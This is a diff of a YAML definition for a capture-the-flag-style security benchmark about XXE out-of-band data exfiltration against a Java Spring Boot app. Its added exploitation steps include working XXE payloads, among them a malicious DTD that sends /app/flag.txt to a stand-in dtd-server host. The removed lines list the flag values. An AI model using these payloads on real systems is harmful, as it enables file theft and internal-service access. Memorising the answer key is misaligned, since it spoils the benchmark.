@@ -1,161 +1,46 @@
 id: S7BEN-VHARD-007
 name: "XXE Out-of-Band Data Exfiltration"
 tier: 2
-category: web
-subcategory: xml_injection
-difficulty: intermediate
-estimated_time: 45-75 minutes
-
-description: |
-  Exploit XML External Entity (XXE) injection vulnerabilities to achieve out-of-band
-  data exfiltration. This benchmark demonstrates XXE in Java Spring Boot applications,
-  external DTD hosting for exploitation, and techniques for exfiltrating sensitive
-  files from internal services.
-
-learning_objectives:
-  - Understanding XML parsing and entity resolution
-  - Identifying XXE vulnerabilities in XML parsers
-  - Crafting malicious external DTDs for exploitation
-  - Performing out-of-band (OOB) data exfiltration
-  - Exploiting XXE to read internal files
-  - Understanding Java XML parser configurations
-
+difficulty: 9
+category: vhard
+description: "Java Spring Boot application that parses XML input, with an internal API and an external DTD server."
+objective: "Obtain the flags from the web application and internal service via XML processing."
 vulnerabilities:
-  - cve: CWE-611
-    name: "XML External Entity (XXE) Injection"
-    description: "Unsafe XML parsing allows external entity resolution"
-    severity: critical
-
-  - cve: CUSTOM-XXE-01
-    name: "DocumentBuilder XXE in Spring Boot"
-    description: "Java DocumentBuilder configured without security features"
-    severity: critical
-
-  - cve: CUSTOM-XXE-02
-    name: "Out-of-Band XXE via External DTD"
-    description: "External DTD hosting enables data exfiltration via HTTP"
-    severity: high
-
+  - type: XML External Entity Injection
+    cwes: [CWE-611]
+owasp_2025: [A05:2025]
+difficulty_dimensions:
+  recon: medium
+  exploit: very_high
+  chaining: high
 architecture:
-  containers:
+  type: microservices
+  container_count: 3
+  services:
     - name: web-app
-      purpose: "Spring Boot application with vulnerable XML parser"
-      exposed_ports: [8080]
-      technologies: [Java 11, Spring Boot 2.7, DocumentBuilder]
-
+      port: 8080
+      exposed: true
     - name: internal-api
-      purpose: "Internal service with sensitive configuration files"
-      exposed_ports: []
-      technologies: [Python Flask, File storage]
-
+      port: 5000
+      exposed: false
     - name: dtd-server
-      purpose: "Attacker-controlled DTD hosting server"
-      exposed_ports: [8888]
-      technologies: [Python HTTP server, DTD logging]
-
-  network:
-    type: bridge
-    networks:
-      - frontend-net: web-app, dtd-server exposed
-      - backend-net: internal-api isolated
-    isolation: Internal API not directly accessible
-
-attack_chain:
-  phases:
-    - phase: 1
-      name: "XML Endpoint Discovery"
-      description: "Identify XML parsing endpoints in the application"
-      objectives:
-        - Discover /api/xml/parse endpoint
-        - Test XML input acceptance
-        - Identify XML parser type (Java DocumentBuilder)
-        - Verify Content-Type requirements
-
-    - phase: 2
-      name: "Basic XXE Testing"
-      description: "Test for XXE vulnerability with local entity"
-      objectives:
-        - Inject simple external entity
-        - Test file:// protocol support
-        - Read /etc/hostname or /etc/passwd
-        - Confirm XXE vulnerability exists
-
-    - phase: 3
-      name: "External DTD Hosting"
-      description: "Set up attacker-controlled DTD server"
-      objectives:
-        - Understand DTD server at port 8888
-        - Craft malicious DTD file
-        - Host DTD with parameter entities
-        - Test DTD accessibility from web-app
-
-    - phase: 4
-      name: "Out-of-Band Exfiltration"
-      description: "Exfiltrate data via external DTD and HTTP requests"
-      objectives:
-        - Use parameter entities for OOB extraction
-        - Exfiltrate /app/flag.txt from web-app
-        - Capture data in DTD server logs
-        - Extract first flag
-
-    - phase: 5
-      name: "Internal Service Access"
-      description: "Exploit XXE to access internal-api files"
-      objectives:
-        - Use XXE to make internal HTTP requests
-        - Access internal-api via http://internal-api:5000
-        - Read internal configuration files
-        - Extract flags from internal service
-
-flags:
-  - id: FLAG_XXE_WEB
-    value: "S7BEN{xxe_external_entity_file_read_a1b2c3}"
-    location: "/app/flag.txt"
-    description: "Obtained via XXE file read from web-app container"
-
-  - id: FLAG_XXE_INTERNAL
-    value: "S7BEN{xxe_internal_api_access_d4e5f6}"
-    location: "/data/internal_flag.txt"
-    description: "Obtained via XXE to access internal-api service"
-
-  - id: FLAG_XXE_OOB
-    value: "S7BEN{xxe_out_of_band_exfiltration_g7h8i9}"
-    location: "DTD server logs"
-    description: "Obtained via successful OOB data exfiltration"
-
-tools_required:
-  - curl or HTTP client
-  - Text editor for crafting XML/DTD payloads
-  - Python 3.x (for DTD server manipulation)
-  - Docker (for accessing container logs)
-
-hints:
-  - "Java DocumentBuilder is vulnerable by default without setFeature() security settings"
-  - "External DTDs can be hosted on dtd-server at port 8888"
-  - "Parameter entities (%param;) enable out-of-band data exfiltration"
-  - "Use file:// protocol to read local files"
-  - "Use http:// protocol to access internal services"
-
-tags:
-  - xxe
-  - xml
-  - out-of-band
-  - java
-  - spring-boot
-  - dtd
-  - file-disclosure
-  - phase-4
-
-references:
-  - title: "XXE (XML External Entity) Injection"
-    url: "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"
-
-  - title: "Out-of-Band XXE"
-    url: "https://portswigger.net/web-security/xxe/blind"
-
-  - title: "Java XML Security"
-    url: "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"
-
-author: "Strike7 Security Benchmarks"
-version: "1.0.0"
-last_updated: "2026-01-13"
+      port: 8888
+      exposed: true
+hints: []
+tags: [xxe, xml, out-of-band, java, spring-boot, dtd, file-disclosure]
+internal_metadata:
+  exploitation_path:
+    hints:
+      - "The web application exposes an XML parsing endpoint"
+      - "The Java DocumentBuilder is configured without security features, enabling external entity resolution"
+      - "file:// protocol can be used to read local files"
+      - "The dtd-server at port 8888 can host attacker-controlled DTD files"
+      - "Parameter entities in external DTDs enable out-of-band data exfiltration"
+      - "http:// protocol can be used to access internal services (SSRF via XXE)"
+    steps:
+      - "Identify the /api/xml/parse endpoint (or equivalent) accepting XML input"
+      - "Test basic XXE: inject <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><foo>&xxe;</foo>"
+      - "Read /app/flag.txt via file:// XXE to obtain the first flag"
+      - "Host a malicious DTD on the dtd-server: <!ENTITY % data SYSTEM \"file:///app/flag.txt\"> <!ENTITY % exfil \"<!ENTITY &#x25; send SYSTEM 'http://dtd-server:8888/?d=%data;'>\">"
+      - "Reference the external DTD in your XXE payload to achieve out-of-band exfiltration"
+      - "Use XXE with http://internal-api:5000/ to access the internal API and read /data/internal_flag.txt"
